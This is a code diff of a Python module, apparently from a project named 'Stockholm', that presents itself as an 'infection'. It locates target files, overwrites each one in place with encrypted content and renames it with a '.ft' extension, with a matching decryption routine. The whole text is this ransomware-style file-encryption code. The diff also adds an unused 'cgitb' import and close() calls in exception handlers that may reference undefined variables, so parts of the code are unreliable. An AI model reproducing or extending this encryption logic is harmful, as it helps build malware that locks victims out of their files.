@@ -1,8 +1,9 @@
 """Library of functions to find and encrypt the wanted files"""
 
+from cgitb import text
 import os
-from src.cipher_functions import encrypt
-from src.cipher_functions import decrypt
+from src.cipher_functions import encrypt_manual
+from src.cipher_functions import decrypt_manual
 
 class Stockholminfection:
     """Class in charge of create the infection"""
@@ -70,11 +71,13 @@ class Encryptation(Stockholminfection):
             try:
                 with open(file, 'rb') as textfile:
                     data_to_encrypt = textfile.read()
+                    textfile.close()
                 with open(file, 'wb') as cipheredfile:
-                    cipheredfile.write(encrypt(data_to_encrypt, self.key))
+                    cipheredfile.write(encrypt_manual(data_to_encrypt, self.key))
                 os.rename(file, file + ".ft")
                 self.logger.logger.info("Successfully encrypted " + file + " !!!\n")
             except Exception:
+                cipheredfile.close()
                 self.logger.logger.error("Unable to encrypt " + file + " :( \n")
 
 class Desencryptation(Stockholminfection):
@@ -104,9 +107,11 @@ class Desencryptation(Stockholminfection):
             try:
                 with open(file, 'rb') as textfile:
                     data_to_decrypt = textfile.read()
+                    textfile.close()
                 with open(file, 'wb') as uncipheredfile:
-                    uncipheredfile.write(decrypt(data_to_decrypt, self.key))
+                    uncipheredfile.write(decrypt_manual(data_to_decrypt, self.key))
                 os.rename(file, file.split(".ft")[0])
                 self.logger.logger.info("Successfully decrypt " + file + " !!!\n")
             except Exception:
+                uncipheredfile.close()
                 self.logger.logger.error("Unable to decrypt " + file + " :( \n")
